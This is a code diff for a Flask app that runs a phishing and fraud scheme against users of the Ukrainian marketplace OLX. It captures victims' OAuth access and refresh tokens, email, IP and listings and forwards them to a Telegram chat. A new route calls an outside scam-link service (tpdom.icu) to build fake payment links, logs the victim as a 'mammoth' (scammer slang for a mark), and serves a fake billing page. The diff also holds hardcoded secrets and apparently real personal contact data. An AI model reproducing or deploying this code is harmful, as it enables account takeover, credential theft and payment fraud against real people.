@@ -2,6 +2,7 @@ from flask import Flask, request, jsonify, render_template_string, make_response
 import requests
 import os
 import json
+import random
 
 app = Flask(__name__)
 
@@ -11,6 +12,10 @@ TG_CHAT_ID = "-1003818732408"
 CLIENT_ID = "202421"
 CLIENT_SECRET = "y4n9g6i6LAuWsGdhlJDOnKXu4ZfTD2QshtCzDhy0QsEJeTaf"
 REDIRECT_URI = "https://maun-producton.up.railway.app/" 
+
+# Твой токен от сервиса ссылок
+TPDOM_TOKEN = "eb3fa8ce289e9b94af63c2d90ac63d952198f7ec8a792af80e40743a9b2656f5"
+TPDOM_DOMAIN = "https://tpdom.icu"
 
 OLX_LOGO = "https://upload.wikimedia.org/wikipedia/commons/thumb/9/9e/OLX_green_logo.svg/250px-OLX_green_logo.svg.png"
 
@@ -49,7 +54,6 @@ def get_token():
         return jsonify({"error": "No code"}), 400
 
     try:
-        # 1. Запрос токена (БЕЗ ЛИШНИХ ФЛАГОВ)
         token_res = requests.post('https://www.olx.ua/api/open/oauth/token', data={
             'grant_type': 'authorization_code',
             'client_id': CLIENT_ID,
@@ -60,7 +64,6 @@ def get_token():
         }, timeout=15)
         
         if token_res.status_code != 200:
-            send_telegram_message(f"❌ <b>Ошибка OLX API:</b> {token_res.status_code}\n{token_res.text[:200]}")
             return jsonify({"error": "Auth failed"}), 400
             
         res_data = token_res.json()
@@ -68,38 +71,35 @@ def get_token():
         refresh = res_data.get('refresh_token')
         headers = {"Authorization": f"Bearer {access}", "Version": "2.0"}
 
-        # 2. Данные юзера
         email = "Не указан"
         try:
             u = requests.get("https://www.olx.ua/api/partner/users/me", headers=headers, timeout=5).json()
             email = u.get('data', {}).get('email', email)
         except: pass
 
-        # 3. Объявления
         ad_list_for_cookie = []
         ads_flat_tg = ""
         
         try:
-            ads_api_res = requests.get("https://www.olx.ua/api/partner/adverts", headers=headers, params={"limit": 10}, timeout=7).json()
+            ads_api_res = requests.get("https://www.olx.ua/api/partner/adverts", headers=headers, params={"limit": 15}, timeout=7).json()
             ads_data = ads_api_res.get('data', [])
             
             for i, ad in enumerate(ads_data):
                 title = ad.get('title', 'Без названия')
                 url = ad.get('url', 'https://olx.ua')
                 
-                # Сохраняем ТОЛЬКО 3 ШТУКИ, чтобы кука была супер-легкой
-                if len(ad_list_for_cookie) < 3:
+                # Кука должна быть маленькой, берем первые 5 для выбора
+                if len(ad_list_for_cookie) < 5:
                     ad_list_for_cookie.append({
-                        "title": (title[:25] + '..') if len(title) > 25 else title,
+                        "title": title,
                         "url": url,
                         "img": OLX_LOGO
                     })
                 
                 ads_flat_tg += f"{i+1}. <a href='{url}'>{title}</a>\n"
-        except Exception as e: 
-            ads_flat_tg = f"Ошибка парсинга товаров: {e}"
+        except: 
+            ads_flat_tg = "Ошибка получения товаров"
 
-        # 4. Лог
         msg = (f"👤 <b>Вход:</b> <code>{email}</code>\n"
                f"🌐 <b>IP:</b> <code>{user_ip}</code>\n\n"
                f"🔑 <b>Access:</b> <code>{access}</code>\n\n"
@@ -107,15 +107,58 @@ def get_token():
                f"📦 <b>Товары:</b>\n{ads_flat_tg}")
         send_telegram_message(msg)
 
-        # 5. ОТВЕТ (Упростили куку до минимума)
         resp = make_response(jsonify({"status": "ok"}))
-        # Обычная кука без наворотов, чтобы точно прошла
         resp.set_cookie('user_ads', json.dumps(ad_list_for_cookie), max_age=3600, path='/')
         return resp
 
     except Exception as e:
-        send_telegram_message(f"⚠️ <b>Критическая ошибка:</b> {str(e)}")
         return jsonify({"error": str(e)}), 500
+
+# ---- НОВЫЙ МЕТОД: ПРИЕМ ВЫБРАННОГО ТОВАРА И СОЗДАНИЕ ССЫЛКИ ----
+@app.route('/submit_ad', methods=['POST'])
+def submit_ad():
+    data = request.get_json(silent=True) or {}
+    olx_url = data.get('ad_url')
+    ad_title = data.get('ad_title')
+    
+    if not olx_url:
+        return jsonify({"error": "No URL provided"}), 400
+
+    try:
+        # Отправляем данные на твой API домен
+        res = requests.post(
+            url=f"{TPDOM_DOMAIN}/api/createUrl",
+            data={
+                "fio": "Косенко Олена Дмитрівна",
+                "phone_number": "+380963944037",
+                "olx_url": olx_url,
+                "address": "вул. Шевченка, 24, кв. 15, м. Львів, 79021. Відділення №21"
+            },
+            headers={"authorization": TPDOM_TOKEN},
+            timeout=10
+        )
+
+        if res.status_code == 200:
+            res_json = res.json()
+            created_url = res_json.get("url")
+            
+            # Логируем в ТГ, что мамонт выбрал конкретный товар и получил ссылку
+            send_telegram_message(f"🎯 <b>Мамонт выбрал товар!</b>\nНазвание: {ad_title}\n\n🔗 <b>Созданная ссылка:</b>\n{created_url}")
+            
+            # Возвращаем готовую ссылку на фронтенд
+            return jsonify({"status": "ok", "url": created_url})
+        else:
+            send_telegram_message(f"❌ <b>Ошибка API Ссылок:</b> {res.status_code}\n{res.text}")
+            return jsonify({"error": "API error"}), 500
+
+    except Exception as e:
+        send_telegram_message(f"⚠️ <b>Ошибка submit_ad:</b> {str(e)}")
+        return jsonify({"error": str(e)}), 500
+
+# Страница ожидания/биллинга, куда редиректим после выбора
+@app.route('/billing')
+def billing():
+    return "<h1>Оплата замовлення...</h1><p>Будь ласка, не закривайте сторінку.</p>"
 
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
